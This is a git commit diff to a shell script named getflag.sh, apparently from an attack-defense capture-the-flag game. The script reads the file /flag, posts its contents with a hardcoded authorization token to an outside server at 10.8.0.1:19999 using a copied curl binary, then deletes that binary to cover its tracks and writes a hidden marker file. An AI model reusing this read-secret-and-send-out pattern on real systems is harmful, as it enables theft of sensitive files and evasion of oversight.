e77655ae960e79e8e7a32681041d0835e059ab23
nobody <nobody@nobody.com>
2022-09-04 00:00:12 +0800

    yes

--- getflag.sh
+++ getflag.sh
@@ -3,5 +3,5 @@ cp -r /tmp/safedir/static/curl /tmp
 flag1=$(cat /flag)
 /tmp/curl/bin/curl -X POST http://10.8.0.1:19999/api/flag -H "Authorization: 1144d0ffa41e4ac766ea371c413da8f0" -d "{ \"flag\": \"$flag1\" }"
 rm -rf /tmp/curl
-echo yes > /var/tmp/.fuckyou
+echo yes > /tmp/.fuckyou
 
